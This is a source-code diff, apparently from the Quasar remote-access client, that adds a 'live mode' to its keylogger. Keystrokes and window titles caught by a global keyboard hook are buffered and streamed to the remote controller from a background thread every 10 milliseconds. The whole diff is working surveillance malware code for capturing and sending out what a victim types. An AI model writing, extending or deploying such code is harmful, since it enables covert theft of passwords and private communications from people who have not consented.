@@ -3,12 +3,14 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.Helper;
 using xClient.Core.MouseKeyHook;
 using xClient.Core.Networking;
 using Timer = System.Timers.Timer;
 using xClient.Config;
+using xClient.Core.Packets.ClientPackets;
 
 namespace xClient.Core.Utilities
 {
@@ -24,6 +26,12 @@ namespace xClient.Core.Utilities
         public static Keylogger Instance;
 
         /// <summary>
+        /// True if Live Mode enabled.  If live mode is enabled, 
+        /// the keylogger will send the processed key events.
+        /// </summary>
+        public bool LiveModeEnabled { get; set; }
+
+        /// <summary>
         /// True if the class has already been disposed, else False.
         /// </summary>
         public bool IsDisposed { get; private set; }
@@ -34,7 +42,9 @@ namespace xClient.Core.Utilities
         public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME); } }
 
         private readonly Timer _timerFlush;
+        private Thread _liveLoggerThread;
         private StringBuilder _logFileBuffer;
+        private StringBuilder _liveKeyEventBuffer;
         private List<Keys> _pressedKeys = new List<Keys>();
         private List<char> _pressedKeyChars = new List<char>();
         private string _lastWindowTitle;
@@ -50,6 +60,7 @@ namespace xClient.Core.Utilities
             Instance = this;
             _lastWindowTitle = string.Empty;
             _logFileBuffer = new StringBuilder();
+            _liveKeyEventBuffer = new StringBuilder();
 
             Subscribe(Hook.GlobalEvents());
 
@@ -112,10 +123,15 @@ namespace xClient.Core.Utilities
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
-                    + KeyloggerHelper.Filter(activeWindowTitle) + " - " 
-                    + DateTime.Now.ToString("HH:mm") 
-                    + "</b>]</p><br>");
+                string log = @"<p class=""h""><br><br>[<b>" + 
+                            KeyloggerHelper.Filter(activeWindowTitle) + " - " + 
+                            DateTime.Now.ToString("HH:mm") + 
+                            "</b>]</p><br>";
+
+                _logFileBuffer.Append(log);
+
+                if (LiveModeEnabled)
+                    _liveKeyEventBuffer.Append(log);
             }
 
             if (_pressedKeys.IsModifierKeysSet())
@@ -157,13 +173,22 @@ namespace xClient.Core.Utilities
 
                     _pressedKeyChars.Add(e.KeyChar);
                     _logFileBuffer.Append(filtered);
+
+                    if (LiveModeEnabled)
+                        _liveKeyEventBuffer.Append(filtered);
                 }
             }
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
-            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
+            string specialKeys = HighlightSpecialKeys(_pressedKeys.ToArray());
+
+            _logFileBuffer.Append(specialKeys);
+
+            if (LiveModeEnabled)
+                _liveKeyEventBuffer.Append(specialKeys);
+
             _pressedKeyChars.Clear();
         }
 
@@ -275,7 +300,6 @@ namespace xClient.Core.Utilities
 
                 if (_logFileBuffer.Length > 0)
                 {
-
                     logFile.Append(_logFileBuffer);
                 }
 
@@ -288,6 +312,32 @@ namespace xClient.Core.Utilities
             }
 
             _logFileBuffer.Clear();
+        }
+
+        public void EnableLiveLogging(bool enable, Client client)
+        {
+            this.LiveModeEnabled = enable;
+
+            if (this.LiveModeEnabled)
+            {
+                _liveLoggerThread = new Thread(() =>
+                {
+                    while (client.Connected && this.LiveModeEnabled)
+                    {
+                        //only process live packet if anything was recently appended
+                        if (_liveKeyEventBuffer.Length > 0 && !QuasarClient.Exiting)
+                        {
+                            new GetKeyloggerLiveResponse(_liveKeyEventBuffer.ToString()).Execute(client);
+                            _liveKeyEventBuffer.Clear();
+                        }
+                        Thread.Sleep(10);
+                    }
+                    _liveKeyEventBuffer.Clear();
+                });
+                _liveLoggerThread.Start();
+            }
+            else
+                _liveLoggerThread.Abort();
         }
     }
 }
